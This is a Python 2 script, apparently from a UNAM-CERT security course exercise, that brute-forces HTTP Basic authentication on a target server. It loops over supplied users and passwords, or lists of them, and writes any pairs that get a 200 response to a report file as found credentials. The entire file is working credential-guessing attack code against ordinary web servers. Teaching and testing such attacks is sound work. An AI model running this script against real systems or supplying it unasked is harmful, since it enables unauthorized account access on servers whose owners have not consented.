#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT

import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError

def printError(msg, exit = False):
    sys.stderr.write('Error:\t%s\n' % msg)
    if exit:
        sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-v','--verbose', dest='verbose', default=False, action='store_true', help='If specified, prints detailed information during execution.')
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-r','--report', dest='report', default='t5_reporte.txt', help='File where the results will be reported.')
    parser.add_option('-u', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-w', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-U', '--user-list', dest='user_list', default=None, help='List of users that will be tested during the attack.')
    parser.add_option('-W', '--password-list', dest='password_list', default=None, help='List of passwords that will be tested during the attack.')
    parser.add_option('-t','--tls', dest='tls', default=False, action='store_true', help='If specified, HTTPS protocol will be used instead of default HTTP.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
    if not options.password and not options.password_list:
        printError('Especificar una contraseña o una lista de contraseñas a probar.', True)
    if not options.user and not options.user_list:
        printError('Especificar un usuario o una lista de usuarios a probar.', True)
    if options.password and options.password_list:
        printError('Especificar sólamente una contraseña o una lista de contraseñas.', True)
    if options.user and options.user_list:
        printError('Especificar sólamente un usuario o una lista de usuarios.', True)

def reportResults(archivo, s):
    with open(archivo, "w") as f:
        f.write(s)

def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url

def makeRequest(host, user, password, verboso=False):
    try:
        response = get(host, auth=(user,password))
        if verboso:
            print "Usuario: %s, Contraseña: %s, Respuesta: %s" % (user, password, str(response))
        if response.status_code == 200:
            return True
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)
    return False

def lista_archivo(archivo):
    try:
        f = open(archivo)
        l = f.readlines()
        f.close()
    except IOError:
        printError('No se puede abrir el archivo %s.' % archivo, True)
    return [x[:-1] for x in l]

def get_passwords(password, password_list):
    if password:
        return [password]
    return lista_archivo(password_list)

def get_users(user, user_list):
    if user:
        return [user]
    return lista_archivo(user_list)

if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        if opts.tls:
            url = buildURL(opts.server, port = opts.port, protocol = 'https')
        usuarios = get_users(opts.user, opts.user_list)
        passwords = get_passwords(opts.password, opts.password_list)
        verboso = opts.verbose
        s = ["URL: %s" % (url)]
        if verboso:
            print "Probando conexiones a url: %s" % (url)
        for u in usuarios:
            for p in passwords:
                if makeRequest(url, u, p, verboso):
                    s.append('CREDENCIALES ENCONTRADAS!: %s\t%s' % (u,p))
                    if verboso:
                        print s[-1]
        if len(s) == 1:
            s.append("No se encontró nada")
        reportResults(opts.report, '\n'.join(s))
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
